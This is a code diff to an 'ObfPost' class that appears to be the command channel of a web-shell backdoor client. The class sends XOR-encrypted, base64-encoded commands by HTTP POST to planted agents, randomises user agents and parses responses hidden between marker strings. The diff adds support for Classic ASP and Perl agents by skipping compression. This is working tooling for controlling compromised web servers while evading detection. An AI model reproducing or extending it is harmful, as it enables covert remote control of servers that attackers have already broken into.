@@ -39,7 +39,6 @@ class ObfPost:
         self.re_debug = re.compile(b"%sDEBUG(.*?)%sDEBUG" % (self.header, self.trailer), re.DOTALL)
 
         # Load agent
-        # TODO: add this to the other channels
         agents = utils.http.load_all_agents()
         random.shuffle(agents)
         self.agent = agents[0]
@@ -51,7 +50,13 @@ class ObfPost:
         if isinstance(original_payload, str):
             original_payload = original_payload.encode("utf-8")
 
-        xorred_payload = utils.strings.sxor(zlib.compress(original_payload), self.shared_key)
+        # Classic ASP and Perl agents do not support GZIP
+        if self.url.lower().endswith((".asp", ".pl")):
+            compressed_payload = original_payload
+        else:
+            compressed_payload = zlib.compress(original_payload)
+
+        xorred_payload = utils.strings.sxor(compressed_payload, self.shared_key)
 
         obfuscated_payload = base64.b64encode(xorred_payload).rstrip(b"=")
 
@@ -74,7 +79,6 @@ class ObfPost:
         try:
             response = opener.open(url, data=wrapped_payload).read()
         except http.client.BadStatusLine:
-            # TODO: add this check to the other channels
             log.warning("Connection closed unexpectedly, aborting command.")
             return None
 
@@ -91,6 +95,11 @@ class ObfPost:
         matched = self.re_response.search(response)
 
         if matched and matched.group(1):
-            return zlib.decompress(utils.strings.sxor(base64.b64decode(matched.group(1)), self.shared_key))
+            decrypted = utils.strings.sxor(base64.b64decode(matched.group(1)), self.shared_key)
+            
+            if self.url.lower().endswith((".asp", ".pl")):
+                return decrypted
+            else:
+                return zlib.decompress(decrypted)
 
         return None
